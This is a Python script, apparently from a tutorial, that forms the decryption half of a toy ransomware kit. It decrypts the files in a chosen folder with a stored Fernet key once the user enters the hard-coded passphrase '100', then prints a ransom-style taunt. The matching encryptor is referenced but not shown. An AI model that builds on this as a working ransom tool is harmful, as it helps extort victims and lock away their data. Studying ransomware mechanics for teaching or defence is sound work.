#!/usr/bin/env python3
# Credit youtube video(accessed on 29/11/2022): https: // www.youtube.com/watch?v = UtMMjXOlRQc
import os
from cryptography.fernet import Fernet
import sys

repeate = 'n'
# gathering files
gathered_files = []
print('------------------------------------------------------')
print('-------------------- DECRYPT -------------------------')
print('------------------------------------------------------')
print('\n')
while repeate == 'N' or repeate == 'n' or (repeate != 'yES' and repeate != 'yeS' and repeate != 'Y' and repeate != 'Yes' and repeate != 'YES' and repeate != 'y' and repeate != 'yes'):
    path = input("Enter file path to decrypt:\n")
    print('------------------------------------------------------')
    print('------------------------------------------------------')
    print('File content:')
    print(*os.listdir(path), sep="\n")
    print('------------------------------------------------------')
    print('------------------------------------------------------')
    print('\n')
    repeate = input("Are these the files you want to decrypt? Y/N:\n ", )
for file in os.listdir(path):
    # Ignore this file, the decryption file and the file containing the key
    if file == sys.argv[0] or file == "mykey.key" or file == "encrypt.py":
        continue
    file_path = os.path.join(path, file)
    if os.path.isfile(file_path):
        gathered_files.append(file_path) 
            
print(gathered_files)

with open("mykey.key", "rb") as key:
    secretkey = key.read()
    
unlock_phrase="100"   
print('-----------------------------------------------------')
print('\n')
user_input= input("Enter the secret phrase to decrypt your files\n")

#if correct phrase then decrypt the files
if user_input == unlock_phrase:
    for file in gathered_files:
        with open(file,"rb") as thefile:
            file_content = thefile.read()
        decrypted_content = Fernet(secretkey).decrypt(file_content)
        with open(file,"wb") as thefile:
            thefile.write(decrypted_content)
    print('-----------------------------------------------------')
    print("Well Done! You have your files and I have new car :))\n Capitalism is awesome")
    print('-----------------------------------------------------')
else:
    print("Sorry wrong passphrase.") 
